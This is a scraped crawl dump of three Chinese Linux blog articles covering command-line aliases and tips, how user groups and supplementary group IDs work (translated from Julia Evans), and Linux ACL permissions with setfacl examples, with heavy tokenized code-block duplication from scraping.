选项可以让你在不使用所有扩展选项的情况下获取到所需要的内容。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ mkdir --help\r\nUsage: mkdir [OPTION]... DIRECTORY...\r\nCreate the DIRECTORY(ies), if they do not already exist.\r\n\r\nMandatory arguments to long options are mandatory for short options too.\r\n -m, --mode=MODE set file mode (as in chmod), not a=rwx - umask\r\n -p, --parents no error if existing, make parent directories as needed\r\n -v, --verbose print a message for each created directory\r\n -Z set SELinux security context of each created directory\r\n to the default type\r\n --context[=CTX] like -Z, or if CTX is specified then set the SELinux\r\n or SMACK security context to CTX\r\n --help display this help and exit\r\n --version output version information and exit\r\n\r\nGNU coreutils online help: \r\nFull documentation at: <http://www.gnu.org/software/coreutils/>\r\nFull documentation at: <http://www.gnu.org/software/coreutils/mkdir>\r\nor available locally via: info '(coreutils) mkdir invocation',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,mkdir, ,--,help,Usage,:, ,mkdir, ,[,OPTION,],.,.,., ,DIRECTORY,.,.,.,Create ,the ,DIRECTORY,(,ies,),,, ,if, ,they ,do, ,not, ,already ,exist,., ,Mandatory ,arguments ,to, ,long, ,options ,are ,mandatory ,for, ,short, ,options ,too,., ,-,m,,, ,--,mode,=,MODE ,set ,file ,mode, ,(,as, ,in, ,chmod,),,, ,not, ,a,=,rwx, ,-, ,umask, ,-,p,,, ,--,parents ,no ,error ,if, ,existing,,, ,make ,parent, ,directories ,as, ,needed, ,-,v,,, ,--,verbose ,print, ,a, ,message ,for, ,each, ,created ,directory, ,-,Z, ,set ,SELinux ,security ,context ,of ,each, ,created ,directory, ,to, ,the ,default, ,type, ,--,context,[,=,CTX,], ,like, ,-,Z,,, ,or, ,if, ,CTX ,is, ,specified ,then, ,set ,the ,SELinux, ,or, ,SMACK ,security ,context ,to, ,CTX, ,--,help ,display ,this, ,help ,and, ,exit, ,--,version ,output ,version ,information ,and, ,exit, ,GNU ,coreutils ,online ,help,:, ,Full ,documentation ,at,:, ,<,http,:,//www.gnu.org/software/coreutils/>,Full ,documentation ,at,:, ,<,http,:,//www.gnu.org/software/coreutils/mkdir>,or, ,available ,locally ,via,:, ,info, ,'(coreutils) mkdir invocation',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,谨慎删除文件,\n,如果要谨慎使用 ,rm, 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，对于这种情况，你可能需要看看下一个技巧。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rm -i    <== 请求确认,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rm, ,-,i,    ,<=,=, ,请求确认,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,关闭别名,\n,你可以使用 ,unalias, 命令以交互方式禁用别名。它不会更改别名的配置，而仅仅是暂时禁用，直到下次登录或重新设置了这一个别名才会重新生效。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ unalias rm,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,unalias ,rm,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果已经将 ,rm -i, 默认设置为 ,rm, 的别名，但你希望在删除文件之前不必进行确认，则可以将 ,unalias, 命令放在一个启动文件（例如 ,~/.bashrc,）中。,\n,使用 sudo,\n,如果你经常在只有 root 用户才能执行的命令前忘记使用 ,sudo,，这里有两个方法可以解决。一是利用命令历史记录，可以使用 ,sudo !!,（使用 ,!!, 来运行最近的命令，并在前面添加 ,sudo,）来重复执行，二是设置一些附加了所需 ,sudo, 的命令别名。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ alias update=’sudo apt update’,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,alias ,update,=,’,sudo ,apt ,update,’,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,更复杂的技巧,\n,有时命令行技巧并不仅仅是一个别名。毕竟，别名能帮你做的只有替换命令以及增加一些命令参数，节省了输入的时间。但如果需要比别名更复杂功能，可以通过编写脚本、向 ,.bashrc, 或其他启动文件添加函数来实现。例如，下面这个函数会在创建一个目录后进入到这个目录下。在设置完毕后，执行 ,source .bashrc,，就可以使用 ,md temp, 这样的命令来创建目录立即进入这个目录下。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmd () { mkdir -p \"$@\" && cd \"$1\"; },\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,md, ,(,), ,{, ,mkdir, ,-,p, ,\"$@\", ,&&, ,cd, ,\"$1\",;, ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,总结,\n,使用 Linux 命令行是在 Linux 系统上工作最有效也最有趣的方法，但配合命令行技巧和巧妙的别名可以让你获得更好的体验。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114424/", "url_object_id": "4ec0c47364d8da2a88a5b72afa15d3f9", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "“用户组”在 Linux 上到底是怎么工作的？", "create_time": "2018/10/02", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Julia Evans,   译文出处：,Linux中国/DavidChenLiang,   ,嗨！就在上周，我还自认为对 Linux 上的用户和组的工作机制了如指掌。我认为它们的关系是这样的：,\n,\n,每个进程都属于一个用户（比如用户 ,julia,）,\n,当这个进程试图读取一个被某个组所拥有的文件时， Linux 会 a. 先检查用户,julia, 是否有权限访问文件。（LCTT 译注：此处应该是指检查文件的所有者是否就是 ,julia,） b. 检查 ,julia, 属于哪些组，并进一步检查在这些组里是否有某个组拥有这个文件或者有权限访问这个文件。,\n,如果上述 a、b 任一为真（或者“其它”位设为有权限访问），那么这个进程就有权限访问这个文件。,\n,\n,比如说，如果一个进程被用户 ,julia, 拥有并且 ,julia, 在,awesome, 组，那么这个进程就能访问下面这个文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nr--r--r-- 1 root awesome     6872 Sep 24 11:09 file.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,r,--,r,--,r,--, ,1, ,root ,awesome,     ,6872, ,Sep, ,24, ,11,:,09, ,file,.,txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然而上述的机制我并没有考虑得非常清楚，如果你硬要我阐述清楚，我会说进程可能会在,运行时,去检查 ,/etc/group, 文件里是否有某些组拥有当前的用户。,\n,然而这并不是 Linux 里“组”的工作机制,\n,我在上个星期的工作中发现了一件有趣的事，事实证明我前面的理解错了，我对组的工作机制的描述并不准确。特别是 Linux ,并不会,在进程每次试图访问一个文件时就去检查这个进程的用户属于哪些组。,\n,我在读了《,Linux 编程接口,》这本书的第九章（“进程资格”）后才恍然大悟（这本书真是太棒了），这才是组真正的工作方式！我意识到之前我并没有真正理解用户和组是怎么工作的，我信心满满的尝试了下面的内容并且验证到底发生了什么，事实证明现在我的理解才是对的。,\n,用户和组权限检查是怎么完成的,\n,现在这些关键的知识在我看来非常简单! 这本书的第九章上来就告诉我如下事实：用户和组 ID 是,进程的属性,，它们是：,\n,\n,真实用户 ID 和组 ID；,\n,有效用户 ID 和组 ID；,\n,保存的 set-user-ID 和保存的 set-group-ID；,\n,文件系统用户 ID 和组 ID（特定于 Linux);,\n,补充的组 ID；,\n,\n,这说明 Linux ,实际上,检查一个进程能否访问一个文件所做的组检查是这样的：,\n,\n,检查一个进程的组 ID 和补充组 ID（这些 ID 就在进程的属性里，,并不是,实时在 ,/etc/group, 里查找这些 ID）,\n,检查要访问的文件的访问属性里的组设置,\n,确定进程对文件是否有权限访问（LCTT 译注：即文件的组是否是以上的组之一）,\n,\n,通常当访问控制的时候使用的是,有效,用户/组 ID，而不是,真实,用户/组 ID。技术上来说当访问一个文件时使用的是,文件系统,的 ID，它们通常和有效用户/组 ID 一样。（LCTT 译注：这句话针对 Linux 而言。）,\n,将一个用户加入一个组并不会将一个已存在的进程（的用户）加入那个组,\n,下面是一个有趣的例子：如果我创建了一个新的组：,panda, 组并且将我自己（,bork,）加入到这个组，然后运行 ,groups, 来检查我是否在这个组里：结果是我（,bork,）竟然不在这个组？！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nbork@kiwi~> sudo addgroup panda\r\nAdding group `panda' (GID 1001) ...\r\nDone.\r\nbork@kiwi~> sudo adduser bork panda\r\nAdding user `bork' to group `panda' ...\r\nAdding user bork to group panda\r\nDone.\r\nbork@kiwi~> groups\r\nbork adm cdrom sudo dip plugdev lpadmin sambashare docker lxd\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,bork,@,kiwi,~,>, ,sudo ,addgroup ,panda,Adding ,group, ,`,panda,' (GID 1001) ...,Done.,bork@kiwi~> sudo adduser bork panda,Adding user `bork', ,to, ,group, ,`,panda,', ,.,.,.,Adding ,user ,bork ,to, ,group ,panda,Done,.,bork,@,kiwi,~,>, ,groups,bork ,adm ,cdrom ,sudo ,dip ,plugdev ,lpadmin ,sambashare ,docker ,lxd, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,panda, 并不在上面的组里！为了再次确定我们的发现，让我们建一个文件，这个文件被 ,panda, 组拥有，看看我能否访问它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$  touch panda-file.txt\r\n$  sudo chown root:panda panda-file.txt\r\n$  sudo chmod 660 panda-file.txt\r\n$  cat panda-file.txt\r\ncat: panda-file.txt: Permission denied,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,  ,touch ,panda,-,file,.,txt,$,  ,sudo ,chown ,root,:,panda ,panda,-,file,.,txt,$,  ,sudo ,chmod, ,660, ,panda,-,file,.,txt,$,  ,cat ,panda,-,file,.,txt,cat,:, ,panda,-,file,.,txt,:, ,Permission ,denied,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,好吧，确定了，我（,bork,）无法访问 ,panda-file.txt,。这一点都不让人吃惊，我的命令解释器并没有将 ,panda, 组作为补充组 ID，运行 ,adduser bork panda, 并不会改变这一点。,\n,那进程一开始是怎么得到用户的组的呢？,\n,这真是个非常令人困惑的问题，对吗？如果进程会将组的信息预置到进程的属性里面，进程在初始化的时候怎么取到组的呢？很明显你无法给你自己指定更多的组（否则就会和 Linux 访问控制的初衷相违背了……）,\n,有一点还是很清楚的：一个新的进程是怎么从我的命令行解释器（,/bash/fish,）里被,执行,而得到它的组的。（新的）进程将拥有我的用户 ID（,bork,），并且进程属性里还有很多组 ID。从我的命令解释器里执行的所有进程是从这个命令解释器里 ,fork(), 而来的，所以这个新进程得到了和命令解释器同样的组。,\n,因此一定存在一个“第一个”进程来把你的组设置到进程属性里，而所有由此进程而衍生的进程将都设置这些组。而那个“第一个”进程就是你的登录程序login shell，在我的笔记本电脑上，它是由 ,login, 程序（,/bin/login,）实例化而来。登录程序以 root 身份运行，然后调用了一个 C 的库函数 —— ,initgroups, 来设置你的进程的组（具体来说是通过读取 ,/etc/group, 文件），因为登录程序是以 root 运行的，所以它能设置你的进程的组。,\n,让我们再登录一次,\n,好了！假如说我们正处于一个登录程序中，而我又想刷新我的进程的组设置，从我们前面所学到的进程是怎么初始化组 ID 的，我应该可以通过再次运行登录程序来刷新我的进程组并启动一个新的登录命令！,\n,让我们试试下边的方法：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo login bork\r\n$ groups\r\nbork adm cdrom sudo dip plugdev lpadmin sambashare docker lxd panda\r\n$ cat panda-file.txt # it works! I can access the file owned by `panda` now!,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,login ,bork,$, ,groups,bork ,adm ,cdrom ,sudo ,dip ,plugdev ,lpadmin ,sambashare ,docker ,lxd ,panda,$, ,cat ,panda,-,file,.,txt, ,# it works! I can access the file owned by `panda` now!,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当然，成功了！现在由登录程序衍生的程序的用户是组 ,panda, 的一部分了！太棒了！这并不会影响我其他的已经在运行的登录程序（及其子进程），如果我真的希望“所有的”进程都能对 ,panda, 组有访问权限。我必须完全的重启我的登录会话，这意味着我必须退出我的窗口管理器然后再重新登录。（LCTT 译注：即更新进程树的树根进程，这里是窗口管理器进程。）,\n,newgrp 命令,\n,在 Twitter 上有人告诉我如果只是想启动一个刷新了组信息的命令解释器的话，你可以使用 ,newgrp,（LCTT 译注：不启动新的命令解释器），如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo addgroup panda\r\nsudo adduser bork panda\r\nnewgrp panda # starts a new shell, and you don't have to be root to run it!,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,addgroup ,panda,sudo ,adduser ,bork ,panda,newgrp ,panda, ,# starts a new shell, and you don't have to be root to run it!,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以用 ,sg panda bash, 来完成同样的效果，这个命令能启动一个,bash, 登录程序，而这个程序就有 ,panda, 组。,\n,seduid 将设置有效用户 ID,\n,其实我一直对一个进程如何以 ,setuid root, 的权限来运行意味着什么有点似是而非。现在我知道了，事实上所发生的是：,setuid, 设置了,\n“有效用户 ID”! 如果我（,julia,）运行了一个 ,setuid root, 的进程（ 比如 ,passwd,），那么进程的,真实,用户 ID 将为 ,julia,，而,有效,用户 ID 将被设置为 ,root,。,\n,passwd, 需要以 root 权限来运行，但是它能看到进程的真实用户 ID 是 ,julia, ，是 ,julia, 启动了这个进程，,passwd, 会阻止这个进程修改除了 ,julia, 之外的用户密码。,\n,就是这些了！,\n,在《,Linux 编程接口,》这本书里有很多 Linux 上一些功能的罕见使用方法以及 Linux 上所有的事物到底是怎么运行的详细解释，这里我就不一一展开了。那本书棒极了，我上面所说的都在该书的第九章，这章在 1300 页的书里只占了 17 页。,\n,我最爱这本书的一点是我只用读 17 页关于用户和组是怎么工作的内容，而这区区 17 页就能做到内容完备、详实有用。我不用读完所有的 1300 页书就能得到有用的东西，太棒了！,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114427/", "url_object_id": "1d3db4b4ccd8e0817c175a67507d09ae", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/59d49abe8909a122bc2c9aa43b71e3bb.png"], "title": "Linux ACL 权限之进阶篇", "create_time": "2018/09/28", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,sparkdev,   ,笔者在《,Linux ACL 权限,》一文中介绍了 Linux ACL 权限的基本用法，本文笔者将尝试探究 ACL 中的基本概念和实现原理，希望能够通过进一步的加深对 Linux 权限系统的理解。说明：本文的演示环境为 ubuntu 16.04。,\n,ACL 中的基本概念,\n,ACL 的类型,\n,\n,access ACL,：我们可以认为每一个对象(文件/目录)都可以关联一个 ACL 来控制其访问权限，这样的 ACL 被称为 access ACL。,\n,default ACL,：目录也可以关联一个 ACL 来控制在该目录中创建的对象的默认 ACL，这样的 ACL(目录关联的 ACL)被称为 default ACL。,\n,\n,ACL 条目,\n一个 ACL 由多个 ACL 条目组成。一个 ACL 条目指定一个用户或者一组用户对所关联对象的读、写、执行权限。下图展示了 ACL 条目的类型及含义：,\n,\n,ACL 权限与 ugo 权限的对应关系,\n,ACL 定义的权限是 ugo 权限的超集。,\n,\n,文件的 owner 权限对应于 ACL 权限中的 ACL_USER_OBJ 条目。,\n,当 ACL 权限中具有 ACL_MASK 条目时，文件的 group 权限对应于 ACL 权限中的 ACL_MASK 条目。否则，当 ACL 权限中具没有 ACL_MASK 条目时，文件的 group 权限对应于 ACL 权限中的 ACL_GROUP_OBJ 条目。,\n,文件的 other 权限对应于 ACL 权限中的 ACL_OTHER_OBJ 条目。,\n,\n,文件的 ugo 权限总是与对应的 ACL 条目保持一致。修改文件的 ugo 权限会导致修改相关的 ACL 条目，同样的，修改这些 ACL 条目会导致修改对应的 guo 权限。,\n,新建文件的 default ACL,\n,一个文件的 access ACL 会在通过 creat()、mkdir()、mknod()、mkfifo() 和 open() 函数创建该文件时被初始化。,\n,如果一个目录被设置了 default ACL,，那么将会由文件创建函数的 mode 参数和目录的 default ACL 共通决定新文件的 ACL 权限：,\n,\n,新的文件继承父目录的 default ACL 作为自己的 access ACL。,\n,修改与 ugo 权限对应的 access ACL 条目，使其不包含文件创建函数的 mode 参数不包含的权限。,\n,\n,说明：此时 umask 被忽略。,\n,如果一个目录没有被设置 default ACL,，那么将由文件创建函数的 mode 参数和 umask 共同决定新文件的 ACL 权限：,\n,\n,新建文件的 access ACL 包含 ACL_USER_OBJ, ACL_GROUP_OBJ, 和 ACL_OTHER 条目。这些条目的权限被设置为由 umask 决定的权限。,\n,修改与 ugo 权限对应的 access ACL 条目，使其不包含文件创建函数的 mode 参数不包含的权限。,\n,\n,文件权限检查的算法(Access Check Algorithm),\n,当一个进程访问(读、写、执行)一个被 ACL 保护的文件时，文件权限检查的算法决定了是否授权给进程访问该文件。,\n下面我们以 下面我们以伪代码的方式来解释文件权限检查的算法。,\n第一步：,if, 进程的 effective user ID 与文件 owner 匹配,\nif ACL 的 ACL_USER_OBJ 条目包含了请求所需的权限，此时就被授权访问文件,\nelse 访问被拒绝,\n第二步：,else if, 进程的 effective user ID 匹配文件 ACL 权限中任何一个 ACL_USER 条目中的 user,\nif 匹配的 ACL_USER 条目和 ACL_MASK 条目包含了请求所需的权限，此时就被授权访问文件,\nelse 访问被拒绝,\n第三步：,else if, 进程的 effective group ID 或者任何一个补充的(supplementary) group ID 匹配文件的 group 或 ACL 权限中任何一个 ACL_GROUP 条目的 group,\nif ACL 权限包含 ACL_MASK 条目,\nif ACL_MASK 条目和匹配的任何 ACL_GROUP_OBJ 或 ACL_GROUP 条目包含了请求所需的权限，此时就被授权访问文件,\n(注释：ACL_MASK 与其它项是 and 的关系，用来控制最大权限),\nelse 访问被拒绝,\nelse (注意：,没有 ACL_MASK 条目，就没有 ACL_GROUP 条目,),\nif ACL_GROUP_OBJ 条目包含了请求所需的权限，此时就被授权访问文件,\nelse 访问被拒绝,\n第四步：,else if, ACL_OTHER 条目包含了请求所需的权限，此时就被授权访问文件,\n第五步：,else ,访问被拒绝,\n,ACL 的文本描述格式,\n,有两种格式来描述 ACL 条目，分别是长格式和短格式。它们非常类似，都是通过两个冒号把一个 ACL 条目分为三个部分：,\n,ACL 条目的类型:ACL 条目 qualifier:权限信息,\n,我们在前面已经介绍过 ACL 条目的类型，权限信息就是用 rwx 来表示的信息，不支持某个权限的话可以使用 – 表示。这里介绍一下 ACL 条目 qualifier(不知道该咋翻译这货)。,\n,\n,当 ACL 条目的类型为 ACL_USER 或 ACL_GROUP 时，ACL 条目 qualifier 包含与 ACL 条目关联的用户和组的标识符。,\n,当 ACL 条目的类型为其它时，ACL 条目 qualifier 为空。,\n,\n,其中的用户标识符可以是用户名也可以是 user ID，组标识符可以是组名也可以是 group ID。,\n,下面是一组长格式的示例：,\nuser::rw-,\nuser:tester:rw- #effective:r–,\ngroup::r–,\ngroup:tester1:rw- #effective:r–,\nmask::r–,\nother::r–,\n,下面是一组短格式的示例：,\nu::rw-,u:tester:rw-,g::r–,g:tester1:rw-,m::r–,o::r–,\ng:tester1:rw,u:tester:rw,u::wr,g::r,o::r,m::r,\n,解释几个常见的权限变化的例子,\n,前文我们的重点是介绍 ACL 权限的基本用法。有了本文前面介绍的基础内容，我们就可以解释前文中出现的一些比较怪异的现象。,\n创建用户 tester, tester1：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo adduser tester\r\n$ sudo adduser tester1,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,adduser ,tester,$, ,sudo ,adduser ,tester1,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,先创建文件 aclfile，检查其默认的 ACL 权限信息：,\n,\n,然后为 tester 用户赋予读写 aclfile 文件的权限：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ setfacl -m u:tester:rw aclfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,setfacl, ,-,m, ,u,:,tester,:,rw ,aclfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,此时查看 aclfile 文件的权限：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ll aclfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ll ,aclfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,貌似并没有发生什么变化，只是在描述权限的地方多出了一个 “+” 号。下面再看看 acl 权限：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ getfacl aclfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,getfacl ,aclfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,上图的黄框中出现了 ACL_MASK 条目，这就是我们的第一个问题：,\n**************************************************************,\n,我们并没有显式的设置 ACL_MASK 条目，为什么它出现了？,\nAn ACL that contains entries of ACL_USER or ACL_GROUP tag types must contain exactly one entry of the ACL_MASK tag type. If an ACL contains no entries of ACL_USER or ACL_GROUP tag types, the ACL_MASK entry is optional.,\n上面的解释大意是当添加了 ACL_USER 或 ACL_GROUP 后，必须有一个对应的 ACL_MASK 条目。在当前的情况下，ACL_MASK 是被自动创建的，它的权限被设置成了 group(其实是 group class) 的权限即 rw-。,\n**************************************************************,\n,下面我们接着更新 aclfile 的 ACL 权限：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ setfacl -m u:tester:rwx,g:tester1:r aclfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,setfacl, ,-,m, ,u,:,tester,:,rwx,,,g,:,tester1,:,r, ,aclfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,查看文件权限：,\n,\n,在修改了 tester 的权限并添加了 tester1 group 的权限后，我们看到的组权限居然变成了 rwx ！,\n这是我们的第二个问题：,\n**************************************************************,\n,为什么 aclfile 文件的组权限变成了 rwx？,\n这是因为我们设置了  u:tester:rwx 导致的：,\n在设置了 ACL 权限后，group 显示的权限为 ACL_MASK 条目中的权限。而 ACL_MASK 条目中的权限表示 ACL_USER、ACL_GROUP_OBJ 和 ACL_GROUP 条目能够被授予的最大权限，所以当 tester 被设置了 rwx 权限时，ACL_MASK 条目中的权限也发生了相应的变化。并最终导致我们看到了上面的结果：-rw-rwxr–+。,\n**************************************************************,\n,接下来我们看看 acl 权限：,\n,\n,用户 tester 具有 aclfile 的读写执行权限，tester1 group 具有 aclfile 的读权限，但是这里的 mask 却变成了 rwx！,\n这是我们的第三个问题：,\n**************************************************************,\n,上面的设置并没有显式的指定 mask 项，为什么 mask 的值却变了？,\n其实我们在第二个问题中已经回答了这个问题，是因为 tester 被设置了 rwx 权限，最终导致 ACL_MASK 条目中的权限也发生了相应的变化。,\n,这里我们可以思考一下：ACL 权限中为什么需要 ACL_MASK 条目？,\n这是一个需要从长计议的话题，我们应该从 ACL 权限与 ugo 权限的对应说起。在 ugo 权限模型中，定义了 3 个 class 来表示 owner、group、other 的权限。Owner class 表示文件所有者具有的访问权限，group class 表示 owner group 具有的访问权限，other class 表示其它用户所具有的访问权限。在没有显式的设置 ACL 权限时，文件的 ACL 权限与 ugo 权限的对应关系如下图所示：,\n,\n,我们把重点放在 group class 上，此时 group class 的权限和 owner group 的权限是完全一样的。,\n,但是在我们添加了 ACL 权限之后，情况就变得有些复杂了：,\n,\n,此时 group class 中还可能包含 ACL_USER 和 ACL_GROUP 条目中的权限。这样就会出现 owner group 权限与 group class 不一致的情况。,\n解决的办法就是为 ACL 权限引入 ACL_MASK 条目：,\n,\n,没有设置 ACL 权限时，group class 的权限和 owner group 的权限是完全一样的。,\n,设置 ACL 权限后，group class 的权限映射到了 ACL_MASK 条目的权限，ACL_GROUP_OBJ 条目仅仅用来表示 owner group 的权限。,\n,\n,**************************************************************,\n,最后我们再来设置一下 aclfile 的 mask：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ setfacl -m mask::r aclfile\r\n$ getfacl aclfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,setfacl, ,-,m, ,mask,::,r, ,aclfile,$, ,getfacl ,aclfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,ACL 权限的最后一道防线就是 mask 。,它决定了一个用户或组能够得到的最大的权限。,上图中的 #effective 显示了对应行的实际权限。文件权限也反应了上面的变化：,\n,\n,我们的最后一个问题：,\n**************************************************************,\n,为什么需要 effective 权限？,\nACL_MASK 条目 限制的是 ACL_USER、ACL_GROUP_OBJ 和 